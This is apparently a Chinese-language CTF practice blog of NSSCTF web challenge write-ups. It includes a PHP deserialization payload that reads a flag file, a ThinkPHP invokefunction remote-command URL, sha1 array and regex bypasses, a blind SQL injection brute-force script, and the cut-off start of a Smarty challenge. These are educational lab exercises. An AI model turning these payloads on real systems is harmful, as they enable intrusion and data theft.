<span class="variable">$q</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$n</span>,<span class="variable">$p</span>,<span class="variable">$q</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;m = <span class="variable">$m</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;n = <span class="variable">$n</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o = <span class="variable">$o</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;q = <span class="variable">$q</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$i0clay</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$i0clay</span>-&gt;o = &amp;<span class="variable">$i0clay</span>-&gt;n;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$i0clay</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:5:&#123;s:1:&quot;m&quot;;i:1;s:1:&quot;n&quot;;i:1;s:1:&quot;o&quot;;R:3;s:7:&quot;Testq&quot;;b:1;s:4:&quot;*p&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现R的位置也变了，分析出，R 后的数字代表了要引用其他变量的变量所处的位置。当 m 引用 n 时为 R:2，当 o 引用 n 时 为 R:3。</p>
<p>好的，那么我们就能解释官方wp所给的内容了</p>
<p>为了使两值相等，用R:2指定nova是引用neutron的值，所以在反序列化之后就达到了两值相同的效果</p>
<p>运行exp，跳出空白界面，在F12里得到flag信息：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dpklovecloud%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现flag在提示文件夹下</p>
<p>所以回到poc链那里修改file读取为..&#x2F;nssctfasdasdflag(因为尝试直接读取&#x2F;nssctfasdasdflag失败，不在这个目录下，这里就不做演示了)</p>
<p>正式的wp为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A19%3A%22..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A56%3A%22O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22nova%22%3BR%3A2%3B%7D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>传入得到flag。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dpklovecloud%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h3 id="第二种解法："><a href="#第二种解法：" class="headerlink" title="第二种解法："></a>第二种解法：</h3><p>后来觉得这道题有点过于复杂了，所以就又去想了想，发现设置docker变量的值为空也能符合相同的条件</p>
<p>构造payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new ace;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename=&#x27;flag.php&#x27;;</span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker;</span><br><span class="line">&#125;</span><br><span class="line">$a=new acp();</span><br><span class="line">$b=new ace();</span><br><span class="line">$b-&gt;docker=null;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这样也能达到一样的效果</p>
<h2 id="SWPUCTF-2022-新生赛-ez-rce"><a href="#SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_rce"></a>[SWPUCTF 2022 新生赛]ez_rce</h2><p>一进去提示不会什么都没有吧，F12也什么都没有，尝试访问常见文件</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现新文件尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>是一个thinkphp的框架题目</p>
<p>直接用工具进行探测：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.jpg" class>

<p>所测链接直接进行访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>然后挨着挨着查即可</p>
<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node3.anna.nssctf.cn:28299//NSS/index.php/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/nss/ctf/flag/flag</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<h2 id="鹤城杯-2021-Middle-magic"><a href="#鹤城杯-2021-Middle-magic" class="headerlink" title="[鹤城杯 2021]Middle magic"></a>[鹤城杯 2021]Middle magic</h2><p>题目一进去就是源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;./flag.php&quot;;</span><br><span class="line">include &quot;./result.php&quot;;</span><br><span class="line">if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; strlen($_GET[&#x27;aaa&#x27;]) &lt; 20)&#123;</span><br><span class="line"></span><br><span class="line">    $aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]);</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123;</span><br><span class="line">        echo &quot;here is level 2&quot;;</span><br><span class="line">        </span><br><span class="line">        if (isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;])) &#123;</span><br><span class="line">            if ($_POST[&#x27;admin&#x27;] == $_POST[&#x27;root_pwd&#x27;])</span><br><span class="line">                echo &#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;;</span><br><span class="line">        // START FORM PROCESSING    </span><br><span class="line">            else if (sha1($_POST[&#x27;admin&#x27;]) === sha1($_POST[&#x27;root_pwd&#x27;]))&#123;</span><br><span class="line">                echo &quot;here is level 3,do you kown how to overcome it?&quot;;</span><br><span class="line">                if (isset($_POST[&#x27;level_3&#x27;])) &#123;</span><br><span class="line">                    $level_3 = json_decode($_POST[&#x27;level_3&#x27;]);</span><br><span class="line">                    </span><br><span class="line">                    if ($level_3-&gt;result == $result) &#123;</span><br><span class="line">                        </span><br><span class="line">                        echo &quot;success:&quot;.$flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else &#123;</span><br><span class="line">                        echo &quot;you never beat me!&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;out&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                </span><br><span class="line">                die(&quot;no&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        // perform validations on the form data</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#x27;nonono!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>只有第一个判断条件是第一次见的：</p>
<p>要求内容符合：pass_the_level_1#     但是又不能有^(.<em>)level(.</em>)$，但这种正则匹配规定只在一行，所以用%0a换行，这里后面直接放#始终行不通，上网搜搜才知道在url里的#是位置标识符，所以用%23</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>下面的就很熟悉了，使用数组绕过sha1</p>
<p>后面的level_3变量用json格式就行啦</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">aaa=%0apass_the_level_1%23</span><br><span class="line">POST</span><br><span class="line">admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once(&quot;lib.php&quot;);</span><br><span class="line">function alertMes($mes,$url)&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkSql($s) &#123;</span><br><span class="line">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">        alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    if (!$row) &#123;</span><br><span class="line">        alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">        die($FLAG);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  die;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;/index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;账号&quot;&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; / value=&quot;登录&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>好了，那么对于代码进行一个审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="comment">#首先username必须是admin</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);        <span class="comment">#配合上面的checkSql对传入的password进行一个检测，不能符合正则的检测</span></span><br><span class="line">    <span class="comment">#一个sql查询语句，带入数据库进行查询</span></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment"># 最后当我们输入的 password 等于 $password 输出flag</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接嗦一个脚本用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line">alp = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pass</span>():</span><br><span class="line">    url = <span class="string">&quot;http://1.14.71.254:28610/index.php&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> alp:</span><br><span class="line">            data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag+i&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">            resp = requests.post(url=url,data=data)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                flag+=i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;~&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">get_pass()</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dyet_another_mysql_injection%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>密码已经跑出来了，直接进行上传拿到flag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dyet_another_mysql_injection%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h2 id="HNCTF-2022-Week1-easy-html"><a href="#HNCTF-2022-Week1-easy-html" class="headerlink" title="[HNCTF 2022 Week1]easy_html"></a>[HNCTF 2022 Week1]easy_html</h2><p>这道题算是个签到题吧，但是有对于我修改其母代码固性思维的挑战，所以就写一下</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目一进去就这么一句话，而且F12或访问常见文件什么都没有，所以看看请求头</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现在cookie里有奇怪的文件，注意解析，解析之后是&#x2F;f14g.php，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>尝试输入电话号码，发现输入到第10位的时候就无法再输入了，修改对此进行限制的前端代码</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>只要大于电话号码的位数即可，输入并登录就拿到flag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<h2 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster</h2><p>题目有进去就是一个很普通的界面，点进去是一个人的博客，找了找还以为有flag，但是没有，用diresearch扫了一下，发现了这个</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;smarty/smarty&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;library&quot;,</span><br><span class="line">    &quot;description&quot;: &quot;Smarty - the compiling PHP template engine&quot;,</span><br><span class="line">    &quot;keywords&quot;: [</span><br><span class="line">        &quot;templating&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;homepage&quot;: &quot;https://smarty-php.github.io/smarty/&quot;,</span><br><span class="line">    &quot;license&quot;: &quot;LGPL-3.0&quot;,</span><br><span class="line">    &quot;authors&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Monte Ohrt&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;monte@ohrt.com&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Uwe Tews&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;uwe.tews@googlemail.com&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Rodney Rehm&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;rodney.rehm@medialize.de&quot;</span><br><span 